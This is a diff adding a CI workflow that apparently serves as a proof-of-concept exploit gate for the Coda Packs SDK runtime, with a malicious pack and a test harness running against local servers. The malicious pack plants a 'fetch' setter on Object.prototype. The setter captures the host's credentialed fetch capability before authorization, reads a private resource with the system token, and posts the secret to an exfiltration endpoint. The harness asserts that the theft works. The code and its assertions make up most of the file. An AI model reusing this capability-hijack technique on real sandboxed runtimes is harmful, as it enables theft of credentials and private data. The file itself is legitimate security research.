@@ -1,0 +1,405 @@
+name: Superhuman pre-dispatch fetch capability exact gate
+
+on:
+  push:
+    branches: [research/superhuman-pre-dispatch-capability-20260810]
+    paths: [.github/workflows/superhuman-pre-dispatch-fetch-capability-gate.yml]
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: write
+
+jobs:
+  gate:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+        with: {fetch-depth: 1}
+      - uses: actions/setup-node@v4
+        with: {node-version: '22'}
+
+      - name: Install exact stable runtime
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf pre-dispatch-gate
+          mkdir -p pre-dispatch-gate/evidence public-intake-status
+          cd pre-dispatch-gate
+          npm init -y >/dev/null
+          npm install --no-audit --no-fund @codahq/packs-sdk@1.17.1
+
+      - name: Compile upload-valid Packs and run canonical isolated-vm gate
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd pre-dispatch-gate
+
+          cat > malicious-pack.ts <<'PACK'
+          import * as sdk from "@codahq/packs-sdk";
+          import {ReservedAuthenticationNames} from "@codahq/packs-sdk/dist/types";
+
+          export const pack = sdk.newPack();
+          pack.setVersion("1.0.0");
+          pack.addNetworkDomain("127.0.0.1:39111");
+          pack.addNetworkDomain("127.0.0.1:39112");
+          pack.setUserAuthentication({
+            type: sdk.AuthenticationType.HeaderBearerToken,
+            networkDomain: "127.0.0.1:39111",
+          });
+          pack.setSystemAuthentication({
+            type: sdk.AuthenticationType.HeaderBearerToken,
+            networkDomain: "127.0.0.1:39111",
+          });
+          pack.addFormula({
+            name: "RestrictedAction",
+            description: "Synthetic action restricted to a personal connection.",
+            parameters: [],
+            resultType: sdk.ValueType.String,
+            connectionRequirement: sdk.ConnectionRequirement.Required,
+            allowedAuthenticationNames: [ReservedAuthenticationNames.Default],
+            execute: async function () {
+              return "FORMULA_SHOULD_NOT_RUN";
+            },
+          });
+
+          // The official runtime loads untrusted Pack code before injecting host capability stubs.
+          // Avoid changing the Node process used by the CLI compiler/importer; install only in the isolate.
+          if (typeof (globalThis as any).process === "undefined") {
+            Object.defineProperty(Object.prototype, "fetch", {
+              configurable: true,
+              set(capability: unknown) {
+                const g = globalThis as any;
+                if (g.__LAB_CAPTURE_STARTED || typeof capability !== "function") {
+                  return;
+                }
+                g.__LAB_CAPTURE_STARTED = true;
+                g.__LAB_CAPTURED_FETCH = capability;
+                g.__LAB_ATTACK_PROMISE = (async () => {
+                  const response = await (capability as Function)({
+                    method: "GET",
+                    url: g.__LAB_SENSITIVE_URL,
+                  });
+                  g.__LAB_READ_RESULT = response.body;
+                  await (capability as Function)({
+                    method: "POST",
+                    url: g.__LAB_EXFIL_URL,
+                    disableAuthentication: true,
+                    headers: {"content-type": "application/json"},
+                    body: JSON.stringify({stolen: response.body.secret}),
+                  });
+                  return response.body;
+                })();
+              },
+            });
+            (globalThis as any).__LAB_SETTER_INSTALLED = true;
+          }
+          PACK
+
+          cat > benign-pack.ts <<'PACK'
+          import * as sdk from "@codahq/packs-sdk";
+          import {ReservedAuthenticationNames} from "@codahq/packs-sdk/dist/types";
+
+          export const pack = sdk.newPack();
+          pack.setVersion("1.0.0");
+          pack.addNetworkDomain("127.0.0.1:39111");
+          pack.addNetworkDomain("127.0.0.1:39112");
+          pack.setUserAuthentication({
+            type: sdk.AuthenticationType.HeaderBearerToken,
+            networkDomain: "127.0.0.1:39111",
+          });
+          pack.setSystemAuthentication({
+            type: sdk.AuthenticationType.HeaderBearerToken,
+            networkDomain: "127.0.0.1:39111",
+          });
+          pack.addFormula({
+            name: "RestrictedAction",
+            description: "Synthetic action restricted to a personal connection.",
+            parameters: [],
+            resultType: sdk.ValueType.String,
+            connectionRequirement: sdk.ConnectionRequirement.Required,
+            allowedAuthenticationNames: [ReservedAuthenticationNames.Default],
+            execute: async function () {
+              return "FORMULA_SHOULD_NOT_RUN";
+            },
+          });
+          PACK
+
+          cat > gate.js <<'NODE'
+          'use strict';
+          const assert = require('assert');
+          const crypto = require('crypto');
+          const fs = require('fs');
+          const http = require('http');
+          const path = require('path');
+
+          const sdkRoot = path.dirname(require.resolve('@codahq/packs-sdk/package.json'));
+          const {compilePackBundle} = require(path.join(sdkRoot, 'dist/testing/compile.js'));
+          const {compilePackMetadata} = require(path.join(sdkRoot, 'dist/helpers/metadata.js'));
+          const {validatePackVersionMetadata} = require(path.join(sdkRoot, 'dist/testing/upload_validation.js'));
+          const {importManifest} = require(path.join(sdkRoot, 'dist/cli/helpers.js'));
+          const bootstrap = require(path.join(sdkRoot, 'dist/runtime/bootstrap/index.js'));
+          const {AuthenticatingFetcher} = require(path.join(sdkRoot, 'dist/testing/fetcher.js'));
+          const {ReservedAuthenticationNames} = require(path.join(sdkRoot, 'dist/types.js'));
+
+          const SYSTEM_TOKEN = 'LAB_SYSTEM_CAPABILITY_TOKEN_20260810';
+          const PRIVATE_SENTINEL = 'LAB_ORG_PRIVATE_DATA_20260810';
+          const sensitiveRequests = [];
+          const exfilRequests = [];
+          let sensitiveServer;
+          let exfilServer;
+
+          function listen(server, port) {
+            return new Promise((resolve, reject) => {
+              server.once('error', reject);
+              server.listen(port, '127.0.0.1', resolve);
+            });
+          }
+          function close(server) {
+            return new Promise(resolve => server.close(() => resolve()));
+          }
+          function collectBody(req) {
+            return new Promise(resolve => {
+              const chunks = [];
+              req.on('data', chunk => chunks.push(chunk));
+              req.on('end', () => resolve(Buffer.concat(chunks).toString()));
+            });
+          }
+          async function waitFor(predicate, timeoutMs = 8000) {
+            const start = Date.now();
+            while (Date.now() - start < timeoutMs) {
+              if (predicate()) return;
+              await new Promise(resolve => setTimeout(resolve, 25));
+            }
+            throw new Error('Timed out waiting for pre-dispatch capability side effect');
+          }
+          function sha256(file) {
+            return crypto.createHash('sha256').update(fs.readFileSync(file)).digest('hex');
+          }
+
+          async function buildAndValidate(source, outDir) {
+            const result = await compilePackBundle({
+              manifestPath: path.resolve(source),
+              outputDirectory: path.resolve(outDir),
+              intermediateOutputDirectory: path.resolve(outDir + '-intermediate'),
+              minify: false,
+            });
+            const manifest = await importManifest(result.bundlePath);
+            const metadata = compilePackMetadata(manifest);
+            const validated = await validatePackVersionMetadata(metadata, '1.17.1');
+            assert.equal(validated.systemConnectionAuthentication.type, 'HeaderBearerToken');
+            assert.deepEqual(validated.formulas[0].allowedAuthenticationNames, [ReservedAuthenticationNames.Default]);
+            return {result, manifest, metadata, validated};
+          }
+
+          function hostServices(manifest) {
+            const fetcher = new AuthenticatingFetcher(
+              () => {},
+              manifest.systemConnectionAuthentication,
+              manifest.networkDomains,
+              {token: SYSTEM_TOKEN},
+              'LAB_INVOCATION_20260810',
+            );
+            return {
+              fetcher,
+              temporaryBlobStorage: {
+                async storeBlob() { throw new Error('not used'); },
+                async storeUrl() { throw new Error('not used'); },
+              },
+              logger: {trace(){}, debug(){}, info(){}, warn(){}, error(){}},
+            };
+          }
+
+          async function setupRuntime(bundlePath, sourceMapPath, manifest, malicious) {
+            const isolate = bootstrap.createIsolate({memoryLimit: 64});
+            const context = await bootstrap.createIsolateContext(isolate);
+            await context.global.set('__LAB_SENSITIVE_URL', 'http://127.0.0.1:39111/private', {copy: true});
+            await context.global.set('__LAB_EXFIL_URL', 'http://127.0.0.1:39112/collect', {copy: true});
+            await bootstrap.registerBundles(isolate, context, bundlePath, bootstrap.getThunkPath(), true);
+            const setterInstalled = await context.eval('Boolean(globalThis.__LAB_SETTER_INSTALLED)', {copy: true});
+            assert.equal(setterInstalled, malicious);
+            const services = hostServices(manifest);
+            await bootstrap.injectExecutionContext({
+              context,
+              fetcher: services.fetcher,
+              temporaryBlobStorage: services.temporaryBlobStorage,
+              syncStateService: undefined,
+              logger: services.logger,
+              endpoint: undefined,
+              invocationLocation: {protocolAndHost: 'https://coda.io'},
+              timezone: 'UTC',
+              invocationToken: 'LAB_INVOCATION_20260810',
+              sync: undefined,
+              authenticationName: ReservedAuthenticationNames.System,
+              executionId: 'LAB_EXECUTION_20260810',
+              previousAttemptError: undefined,
+            });
+            return {isolate, context, sourceMapPath};
+          }
+
+          async function invokeBlocked(runtime, bundlePath) {
+            let error;
+            try {
+              await bootstrap.executeThunk(
+                runtime.context,
+                {params: [], formulaSpec: {type: 'Standard', formulaName: 'RestrictedAction'}},
+                bundlePath,
+                runtime.sourceMapPath,
+              );
+            } catch (caught) {
+              error = caught;
+            }
+            assert(error, 'Restricted formula unexpectedly executed');
+            assert.match(error.message, /not allowed for connection with authentication systemAuthentication/);
+            return error.message;
+          }
+
+          async function main() {
+            sensitiveServer = http.createServer(async (req, res) => {
+              const body = await collectBody(req);
+              sensitiveRequests.push({method: req.method, url: req.url, authorization: req.headers.authorization || '', body});
+              if (req.headers.authorization !== `Bearer ${SYSTEM_TOKEN}`) {
+                res.writeHead(401, {'content-type': 'application/json'});
+                res.end(JSON.stringify({error: 'missing system credential'}));
+                return;
+              }
+              res.writeHead(200, {'content-type': 'application/json'});
+              res.end(JSON.stringify({secret: PRIVATE_SENTINEL}));
+            });
+            exfilServer = http.createServer(async (req, res) => {
+              const body = await collectBody(req);
+              exfilRequests.push({method: req.method, url: req.url, authorization: req.headers.authorization || '', body});
+              res.writeHead(204);
+              res.end();
+            });
+            await listen(sensitiveServer, 39111);
+            await listen(exfilServer, 39112);
+
+            const malicious = await buildAndValidate('malicious-pack.ts', 'build-malicious');
+            const benign = await buildAndValidate('benign-pack.ts', 'build-benign');
+
+            const maliciousRuntime = await setupRuntime(
+              malicious.result.bundlePath,
+              malicious.result.bundleSourceMapPath,
+              malicious.manifest,
+              true,
+            );
+
+            // The inherited setter executes while injectFetcherFunction assigns the host wrapper.
+            await waitFor(() => exfilRequests.length === 1);
+            const maliciousFormulaError = await invokeBlocked(maliciousRuntime, malicious.result.bundlePath);
+            const capturedCapability = await maliciousRuntime.context.eval(
+              'Boolean(globalThis.__LAB_CAPTURED_FETCH) && Boolean(globalThis.__LAB_CAPTURE_STARTED)',
+              {copy: true},
+            );
+            const readResult = await maliciousRuntime.context.eval('globalThis.__LAB_READ_RESULT', {copy: true});
+
+            assert.equal(capturedCapability, true);
+            assert.equal(readResult.secret, PRIVATE_SENTINEL);
+            assert.equal(sensitiveRequests.length, 1);
+            assert.equal(sensitiveRequests[0].authorization, `Bearer ${SYSTEM_TOKEN}`);
+            assert.equal(exfilRequests.length, 1);
+            assert.equal(exfilRequests[0].authorization, '');
+            assert.deepEqual(JSON.parse(exfilRequests[0].body), {stolen: PRIVATE_SENTINEL});
+
+            const countsBeforeBenign = {sensitive: sensitiveRequests.length, exfil: exfilRequests.length};
+            const benignRuntime = await setupRuntime(
+              benign.result.bundlePath,
+              benign.result.bundleSourceMapPath,
+              benign.manifest,
+              false,
+            );
+            const benignFormulaError = await invokeBlocked(benignRuntime, benign.result.bundlePath);
+            await new Promise(resolve => setTimeout(resolve, 250));
+            assert.deepEqual(
+              {sensitive: sensitiveRequests.length, exfil: exfilRequests.length},
+              countsBeforeBenign,
+              'Benign Pack caused a pre-dispatch network side effect',
+            );
+
+            const result = {
+              pass: true,
+              sdkVersion: require(path.join(sdkRoot, 'package.json')).version,
+              isolatedVmVersion: require('isolated-vm/package.json').version,
+              nodeVersion: process.version,
+              canonicalOrder: 'createIsolateContext -> registerBundles(thunk, untrusted Pack) -> injectExecutionContext -> executeThunk',
+              rootCause: 'Host capability stubs are assigned with ordinary property assignment into objects whose prototype chain is controlled by already-loaded untrusted Pack code. An inherited setter captures and invokes the credentialed fetch wrapper before formula authorization dispatch.',
+              uploadValidation: {
+                maliciousAccepted: true,
+                benignAccepted: true,
+                systemAuthentication: malicious.validated.systemConnectionAuthentication.type,
+                allowedAuthenticationNames: malicious.validated.formulas[0].allowedAuthenticationNames,
+                authNetworkDomain: malicious.validated.systemConnectionAuthentication.networkDomain,
+              },
+              authorizationControl: {
+                maliciousFormulaError,
+                benignFormulaError,
+                restrictedFormulaExecuted: false,
+              },
+              maliciousPreDispatchEffect: {
+                capabilityCaptured: capturedCapability,
+                credentialedReadSucceeded: readResult.secret === PRIVATE_SENTINEL,
+                exfiltrationSucceeded: JSON.parse(exfilRequests[0].body).stolen === PRIVATE_SENTINEL,
+                sensitiveRequest: sensitiveRequests[0],
+                exfilRequest: exfilRequests[0],
+              },
+              negativeControl: {
+                noSetterNoPreDispatchRequests: true,
+                requestCountsBeforeAndAfter: countsBeforeBenign,
+              },
+              bundleHashes: {
+                malicious: sha256(malicious.result.bundlePath),
+                benign: sha256(benign.result.bundlePath),
+                thunk: sha256(bootstrap.getThunkPath()),
+              },
+              syntheticOnly: true,
+              productionRequestCount: 0,
+              decision: 'CONFIRMED_DISTINCT_HIGH_CANDIDATE',
+            };
+            fs.writeFileSync('evidence/RESULT.json', JSON.stringify(result, null, 2) + '\n');
+            fs.writeFileSync('evidence/MALICIOUS_METADATA.json', JSON.stringify(malicious.metadata, null, 2) + '\n');
+            fs.copyFileSync(malicious.result.bundlePath, 'evidence/malicious-bundle.js');
+            fs.copyFileSync(malicious.result.bundleSourceMapPath, 'evidence/malicious-bundle.js.map');
+
+            maliciousRuntime.isolate.dispose();
+            benignRuntime.isolate.dispose();
+          }
+
+          main()
+            .then(async () => {
+              await close(sensitiveServer);
+              await close(exfilServer);
+              console.log(fs.readFileSync('evidence/RESULT.json', 'utf8'));
+            })
+            .catch(async error => {
+              try { if (sensitiveServer) await close(sensitiveServer); } catch (_) {}
+              try { if (exfilServer) await close(exfilServer); } catch (_) {}
+              console.error(error && error.stack || error);
+              process.exit(1);
+            });
+          NODE
+
+          node gate.js | tee evidence/TEST_OUTPUT.txt
+          jq -e '.pass == true and .maliciousPreDispatchEffect.capabilityCaptured == true and .maliciousPreDispatchEffect.credentialedReadSucceeded == true and .maliciousPreDispatchEffect.exfiltrationSucceeded == true and .authorizationControl.restrictedFormulaExecuted == false and .negativeControl.noSetterNoPreDispatchRequests == true' evidence/RESULT.json >/dev/null
+          sha256sum malicious-pack.ts benign-pack.ts gate.js package.json package-lock.json evidence/RESULT.json evidence/MALICIOUS_METADATA.json evidence/malicious-bundle.js evidence/malicious-bundle.js.map evidence/TEST_OUTPUT.txt > evidence/SHA256SUMS.txt
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: superhuman-pre-dispatch-fetch-capability-exact-gate
+          path: pre-dispatch-gate/evidence/
+          retention-days: 1
+          if-no-files-found: warn
+
+      - name: Commit compact result
+        if: github.event_name == 'push' && success()
+        shell: bash
+        run: |
+          set -euo pipefail
+          jq '{pass,sdkVersion,isolatedVmVersion,nodeVersion,canonicalOrder,rootCause,uploadValidation,authorizationControl,maliciousPreDispatchEffect,negativeControl,bundleHashes,syntheticOnly,productionRequestCount,decision}' pre-dispatch-gate/evidence/RESULT.json > public-intake-status/superhuman-pre-dispatch-fetch-capability-result.json
+          git config user.name github-actions[bot]
+          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
+          git add public-intake-status/superhuman-pre-dispatch-fetch-capability-result.json
+          git commit -m 'chore: record pre-dispatch capability gate'
+          git push
